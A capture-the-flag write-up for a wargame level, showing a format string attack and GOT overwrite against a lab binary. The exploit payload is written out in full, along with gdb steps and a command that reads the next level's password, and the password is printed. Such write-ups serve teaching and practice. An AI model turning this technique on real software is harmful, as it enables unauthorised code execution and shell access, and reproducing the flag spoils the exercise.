## Press printf's f for fun and profit episode III (level5)

This level's [binary](source.c) still does the same thing as the last ones. It
takes user input and prints it back to stdin. The input buffer is also directly
given to printf, which means we can once again perform a
[format string attack](https://infosecwriteups.com/exploiting-format-string-vulnerability-97e3d588da1b).
However this time there is no _m_ value to be set. All we have in our function
_n_, after our insecure printf call, is an exit. There is also an other
function, _o_, declared in the binary which calls system and spawns a shell.

We must obviously find a way to call the _o_ function. The only entry point we
have after the printf call is - ironically - our exit call. The call instruction
refers to an address where the function resides. If we could rewrite the call
instruction to point to _o_ or to make the exit address point to it, this would
do the trick.

One way to do this is through the
[got overwrite](https://infosecwriteups.com/got-overwrite-bb9ff5414628) exploit.

So first we get the GOT address of the exit function:

```shell
# run gdb on level5
gdb ./level5
# print the exit call we want to overwrite in the n function
(gdb) disass n
... # lines removed for clarity
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
# then the got address
(gdb) x/3i 0x80483d0
   0x80483d0 <exit@plt>:        jmp    *0x8049838
   0x80483d6 <exit@plt+6>:      push   $0x28
   0x80483db <exit@plt+11>:     jmp    0x8048370
```

This would be _0x8049838_ here. We can test that the exploit could work by
setting this address' value to the address of the function _o_.

```shell
# get o's address
(gdb) i addr o
Symbol "o" is at 0x80484a4 in a file compiled without debugging.
# break on the exit call
(gdb) b *0x080484ff
(gdb) run
Starting program: /home/user/level5/level5
random input
random input

Breakpoint 1, 0x080484ff in n ()
# now replace the exit's got address with o
(gdb) set *0x8049838 = 0x80484a4
(gdb) c
Continuing.
# here we are (well still at level5, but theoretically it works)
$ whoami
level5
```

This works. So the goal now is to do it though the format string attack on the
printf call. This is basically the same exploit as is in the last level except
that the _m_ address is replaced with exit's got address.

We start getting to our buffer from the fourth conversion:

```
./level5
aaaabbbbccccddddeeeefghijklm %p %p %p %p
aaaabbbbccccddddeeeefghijklm 0x200 0xb7fd1ac0 0xb7ff37d0 0x61616161
```

Now we simply adapt the last level's exploit for this binary:

```shell
# feed the exploit payload to the binary
(python -c 'print "\x08\x04\x84\x7f"[::-1] + 4 * "a" + "\x08\x04\x98\x38"[::-1] + "%p%p%p%0*p%n"'; cat) | ./level5
# it works ;)
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

The first four bytes are the length to add to printfs's return value to return
_o_'s address. After the padding we have the location of exit's got address and
finally the format string to pop our values from the stack.
